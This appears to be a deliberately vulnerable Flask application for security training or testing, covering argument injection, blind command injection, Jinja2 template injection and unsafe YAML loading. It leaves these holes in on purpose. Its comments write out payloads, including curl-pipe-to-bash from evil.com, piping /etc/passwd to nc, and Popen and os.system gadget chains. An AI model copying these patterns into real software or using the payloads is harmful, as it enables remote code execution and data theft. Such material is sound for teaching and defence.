"""
Code Execution & Template Vulnerabilities
Contains: Command Injection (Argument Injection), Blind Command Injection (Worker),
          Blind SSTI, YAML Deserialization
"""
import os
import subprocess
import yaml
import threading
import queue
from jinja2 import Template, Environment, BaseLoader
from flask import Flask, request, jsonify

app = Flask(__name__)

# Background worker queue for deferred command execution
job_queue = queue.Queue()


# ============================================================================
# VULN 17: Command Injection via Argument Injection (NOT String Concatenation)
# This is the sneaky version. The developer uses subprocess with a list
# (which is normally safe), but the attacker controls an ARGUMENT value
# that the underlying tool interprets as a flag.
# ============================================================================
@app.route("/api/convert/image", methods=["POST"])
def convert_image():
    data = request.get_json()
    input_file = data.get("input", "")
    output_format = data.get("format", "png")

    # The developer thinks this is safe because they're using a list (no shell=True).
    # But ImageMagick's `convert` has dangerous delegates.
    # Attacker sends input = "https://example.com/image.png; curl http://evil.com/shell.sh | bash"
    # or input = "-write /etc/cron.d/backdoor" (argument injection)
    try:
        output_path = f"/tmp/output.{output_format}"
        # VULNERABLE: Attacker controls input_file, which is passed as an argument.
        # ImageMagick will interpret certain filenames as commands:
        #   input = "ephemeral:|id > /tmp/pwned"
        #   input = "msl:/tmp/payload.msl" (reads an MSL command file)
        subprocess.run(
            ["convert", input_file, output_path],
            timeout=30,
            check=True
        )
        return jsonify({"status": "converted", "output": output_path})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/git/log", methods=["POST"])
def git_log():
    data = request.get_json()
    branch = data.get("branch", "main")

    # VULNERABLE: Argument injection via git.
    # Attacker sends branch = "--exec=id" or branch = "-c protocol.ext.allow=always"
    # Even without shell=True, git interprets these as valid flags.
    result = subprocess.run(
        ["git", "log", "--oneline", "-n", "10", branch],
        capture_output=True, text=True, timeout=10
    )
    return jsonify({"log": result.stdout})


# ============================================================================
# VULN 18: Blind Command Injection via Background Worker
# User input is placed into a job queue. A background thread processes
# jobs asynchronously, executing the payload minutes or hours later.
# There's no immediate response indicating injection worked (blind).
# ============================================================================
def background_worker():
    """Processes jobs from the queue in a separate thread."""
    while True:
        job = job_queue.get()
        if job is None:
            break
        try:
            job_type = job.get("type")
            if job_type == "email":
                recipient = job.get("to", "")
                subject = job.get("subject", "")
                # VULNERABLE: The recipient email is passed to the system mail command.
                # If the attacker sends to = "attacker@evil.com; cat /etc/passwd | nc evil.com 9999"
                # the command runs blindly in the background worker thread.
                os.system(f"echo '{subject}' | mail -s 'Notification' {recipient}")

            elif job_type == "report":
                report_name = job.get("name", "report")
                # VULNERABLE: report_name is interpolated into a shell command.
                os.system(f"wkhtmltopdf http://localhost/reports/{report_name} /tmp/{report_name}.pdf")

        except Exception:
            pass
        finally:
            job_queue.task_done()


worker_thread = threading.Thread(target=background_worker, daemon=True)
worker_thread.start()


@app.route("/api/jobs/email", methods=["POST"])
def queue_email_job():
    data = request.get_json()
    # The injection payload sits in the queue until the worker processes it.
    # The HTTP response returns immediately with "queued" — no error, no output.
    job_queue.put({
        "type": "email",
        "to": data.get("to", ""),
        "subject": data.get("subject", "No Subject"),
    })
    return jsonify({"status": "queued"})


@app.route("/api/jobs/report", methods=["POST"])
def queue_report_job():
    data = request.get_json()
    job_queue.put({
        "type": "report",
        "name": data.get("report_name", "default"),
    })
    return jsonify({"status": "queued"})


# ============================================================================
# VULN 19: Blind SSTI (Server-Side Template Injection)
# User input is directly compiled as a Jinja2 template instead of being
# passed as a variable. The attacker can execute arbitrary Python code.
# ============================================================================
@app.route("/api/render/greeting", methods=["POST"])
def render_greeting():
    data = request.get_json()
    name = data.get("name", "World")

    # VULNERABLE: The user's name is treated as TEMPLATE CODE, not data.
    # If the attacker sends name = "{{ 7*7 }}", they get "Hello 49"
    # If they send name = "{{ config.items() }}", they get all Flask config.
    # If they send name = "{{ ''.__class__.__mro__[1].__subclasses__() }}", RCE.
    template_string = f"Hello {name}! Welcome to our platform."
    env = Environment(loader=BaseLoader())
    template = env.from_string(template_string)
    result = template.render()
    return jsonify({"greeting": result})


@app.route("/api/render/page", methods=["POST"])
def render_custom_page():
    data = request.get_json()
    title = data.get("title", "Page")
    content = data.get("content", "")

    # VULNERABLE: Entire page content is user-controlled template code.
    # Attacker sends content = "{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    #   {% if c.__name__ == 'Popen' %}{{ c('id', shell=True, stdout=-1).communicate() }}{% endif %}
    # {% endfor %}"
    page_template = f"""
    <html>
    <head><title>{title}</title></head>
    <body>{content}</body>
    </html>
    """
    template = Environment(loader=BaseLoader()).from_string(page_template)
    rendered = template.render()
    return jsonify({"html": rendered})


# ============================================================================
# VULN 20: Insecure Deserialization via YAML with Custom Tag Exploitation
# Uses yaml.load() with FullLoader (or the default Loader) instead of
# yaml.safe_load(). This allows executing arbitrary Python via YAML tags.
# ============================================================================
@app.route("/api/import/config", methods=["POST"])
def import_config():
    yaml_data = request.get_data(as_text=True)

    try:
        # VULNERABLE: yaml.load() with Loader=yaml.FullLoader allows
        # instantiation of arbitrary Python objects via YAML tags:
        #
        # !!python/object/apply:os.system
        # args: ['cat /etc/passwd']
        #
        # Or more sophisticated:
        # !!python/object/new:subprocess.Popen
        # args: [['bash', '-c', 'curl evil.com/shell.sh | bash']]
        config = yaml.load(yaml_data, Loader=yaml.FullLoader)  # BUG: should use yaml.safe_load()
        return jsonify({"config": str(config)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/api/import/template", methods=["POST"])
def import_template():
    yaml_data = request.get_data(as_text=True)

    # VULNERABLE: yaml.unsafe_load() explicitly allows ALL Python constructors.
    # This is the nuclear option — the attacker has full RCE.
    try:
        template_data = yaml.unsafe_load(yaml_data)
        return jsonify({"template": str(template_data)})
    except Exception as e:
        return jsonify({"error": str(e)}), 400
